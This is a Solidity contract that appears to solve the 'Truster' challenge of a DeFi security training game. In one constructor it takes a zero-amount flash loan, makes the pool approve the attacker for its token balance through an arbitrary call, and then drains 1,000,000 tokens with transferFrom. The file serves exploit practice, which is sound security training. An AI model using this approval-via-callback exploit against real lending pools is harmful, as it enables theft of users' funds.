// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract NotSoTrustfulBorrower {

    constructor (address pool) {
        TrusterLenderPool pool = TrusterLenderPool(pool);
        IERC20 token = pool.damnValuableToken();
        pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), 1000000 ether));
        token.transferFrom(address(pool), msg.sender, 1000000 ether);
    }
}